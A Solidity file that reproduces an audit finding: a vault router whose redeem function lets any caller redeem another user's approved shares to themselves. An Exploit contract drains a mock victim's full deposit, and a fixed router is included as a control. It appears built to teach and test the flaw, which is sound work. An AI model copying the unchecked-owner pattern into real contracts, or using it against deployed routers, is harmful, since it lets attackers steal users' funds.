// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — anyone can redeem another user's vault shares
    (Pashov Audit Group, finding #53319, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: OmoRouter.redeem takes an `owner` and pulls that owner's shares
    with the allowance the owner granted the router. Any caller can pass a
    victim as owner and themselves as receiver. The fix is to redeem only for
    msg.sender.

    The transferFrom line is the report's snippet, verbatim (@> VULN). */

interface IOmoVault {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function release(uint256 shares, address receiver) external returns (uint256 assets);
}

contract MockAsset {
    string public constant name = "Omo Asset";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoVault is IOmoVault {
    MockAsset public immutable asset;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(MockAsset underlying) {
        asset = underlying;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets;
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function release(uint256 shares, address receiver) external returns (uint256 assets) {
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        assets = shares;
        asset.transfer(receiver, assets);
    }
}

contract OmoRouter {
    mapping(uint256 => address) public vaultOf;

    function setVault(uint256 vaultId, address vault) external {
        require(vaultOf[vaultId] == address(0), "set");
        vaultOf[vaultId] = vault;
    }

    function redeem(uint256 vaultId, uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        address vault = vaultOf[vaultId];
        // Transfer shares from owner to router first
        // @> VULN: spends the router's allowance on `owner`; the caller does not have to be owner
        IOmoVault(vault).transferFrom(owner, address(this), shares);
        assets = IOmoVault(vault).release(shares, receiver);
    }
}

/// @dev Control. The share owner is the caller, so a stranger cannot pass a victim.
contract OmoRouterFixed {
    mapping(uint256 => address) public vaultOf;

    function setVault(uint256 vaultId, address vault) external {
        require(vaultOf[vaultId] == address(0), "set");
        vaultOf[vaultId] = vault;
    }

    function redeem(uint256 vaultId, uint256 shares, address receiver) external returns (uint256 assets) {
        address owner = msg.sender;
        address vault = vaultOf[vaultId];
        IOmoVault(vault).transferFrom(owner, address(this), shares);
        assets = IOmoVault(vault).release(shares, receiver);
    }
}

contract Victim {
    function fundAndApprove(MockAsset asset, OmoVault vault, address router, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(amount);
        vault.approve(router, amount);
    }

    function redeemOwn(OmoRouterFixed router, uint256 vaultId, uint256 shares) external returns (uint256 assets) {
        assets = router.redeem(vaultId, shares, address(this));
    }
}

contract Exploit {
    uint256 public constant VAULT_ID = 1;
    uint256 public constant VICTIM_ASSETS = 1000 ether;

    MockAsset public asset; // CREATE nonce 1
    OmoVault public vault; // CREATE nonce 2
    OmoRouter public router; // CREATE nonce 3
    OmoRouterFixed public fixedRouter; // CREATE nonce 4
    Victim public victim; // CREATE nonce 5

    uint256 public attackerBefore;
    uint256 public attackerAfter;
    uint256 public assetsOut;
    uint256 public victimSharesBefore;
    uint256 public victimSharesAfter;

    constructor() {
        asset = new MockAsset();
        vault = new OmoVault(asset);
        router = new OmoRouter();
        fixedRouter = new OmoRouterFixed();
        victim = new Victim();
        router.setVault(VAULT_ID, address(vault));
        fixedRouter.setVault(VAULT_ID, address(vault));
    }

    function run() external {
        asset.mint(address(victim), VICTIM_ASSETS);
        victim.fundAndApprove(asset, vault, address(router), VICTIM_ASSETS);
        victimSharesBefore = vault.balanceOf(address(victim));
        attackerBefore = asset.balanceOf(msg.sender);
        assetsOut = router.redeem(VAULT_ID, VICTIM_ASSETS, msg.sender, address(victim));
        attackerAfter = asset.balanceOf(msg.sender);
        victimSharesAfter = vault.balanceOf(address(victim));
        require(victimSharesBefore == VICTIM_ASSETS, "victim shares");
        require(attackerBefore == 0, "attacker did not start at 0");
        require(assetsOut == VICTIM_ASSETS, "redeemed amount");
        require(attackerAfter == attackerBefore + VICTIM_ASSETS, "attacker balance");
        require(victimSharesAfter == 0, "victim still has shares");
        require(asset.balanceOf(address(vault)) == 0, "vault retained assets");
    }
}
